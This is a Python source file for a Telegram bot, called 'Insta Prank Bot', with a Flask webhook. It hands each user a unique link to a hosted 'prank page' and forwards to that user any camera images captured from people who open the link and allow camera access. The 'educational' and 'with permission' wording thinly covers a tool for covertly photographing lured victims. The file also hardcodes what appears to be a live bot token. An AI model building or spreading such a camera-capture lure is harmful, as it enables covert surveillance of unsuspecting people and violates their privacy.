from flask import Flask, request
import telegram
import base64

app = Flask(__name__)

from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext
from threading import Thread

BOT_TOKEN = '6515038883:AAF3LfbnrUcQBBWiSYs4qpjQCRNQWUAdG1o'  # Replace this
CHANNEL_USERNAME = '@photopro_10bot'  # Replace this
WEB_BASE_URL = 'https://your-site.netlify.app'  # Replace with your hosted prank page

bot = Bot(token=BOT_TOKEN)
app = Flask(__name__)

# 🟢 Webhook endpoint to receive image
@app.route('/send-photo', methods=['POST'])
def send_photo():
    data = request.json
    user_id = int(data['user_id'])
    img_data = data['img_base64']

    try:
        bot.send_photo(
            chat_id=user_id,
            photo=img_data,
            caption="📸 New image captured from your prank link!\n\n❤️ Made by Team Tasmina"
        )
    except Exception as e:
        print("Error sending image:", e)

    return 'OK', 200

@app.route('/')
def home():
    return "✅ Insta Prank Bot is Live - Team Tasmina"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    Thread(target=run).start()

# ✅ Check if user has joined the channel
def is_user_member(context, user_id):
    try:
        member = context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# /start command
def start(update: Update, context: CallbackContext):
    name = update.effective_user.first_name

    welcome_msg = (
        f"👋 Hello *{name}*, welcome to the *Insta Prank Bot*! 🤖\n\n"
        "🚀 This tool helps you prank your friends (educational & ethical use only).\n\n"
        "🔐 No data is stored — only live image forwarding (with permission).\n\n"
        "⚠️ To continue, you must:\n"
        "1. Accept our Terms & Conditions\n"
        "2. Join our official Telegram channel\n\n"
        "👇 Tap below to proceed."
    )

    update.message.reply_text(
        welcome_msg,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Accept & Continue", callback_data="accept_terms")]
        ])
    )

# After accepting Terms
def accept_terms(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    name = query.from_user.first_name

    join_msg = (
        f"📢 Awesome *{name}*! One last step...\n\n"
        "Please join our official Telegram channel to unlock your prank link 👇"
    )

    query.message.reply_text(
        join_msg,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
            [InlineKeyboardButton("✅ I Joined", callback_data="check_join")]
        ])
    )

# Check if user joined the channel
def check_join(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    name = query.from_user.first_name

    if is_user_member(context, user_id):
        prank_link = f"{WEB_BASE_URL}/?id={user_id}"

        success_msg = (
            f"🎉 You’re in, *{name}*!\n\n"
            f"🔗 *Your unique prank link:* \n`{prank_link}`\n\n"
            "📤 Send it to your friend. If they open and allow camera, you'll get their image here.\n\n"
            "💡 Remember:\n"
            "- Ask friends for permission first\n"
            "- Use only for educational fun\n\n"
            "❤️ *Made with love by Team Tasmina*"
        )

        query.message.reply_text(
            success_msg,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🌐 Open Link", url=prank_link)]
            ])
        )
    else:
        query.message.reply_text("❌ You haven’t joined the channel yet. Please join and try again.")

# Run the bot
def main():
    keep_alive()
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(accept_terms, pattern="accept_terms"))
    dp.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
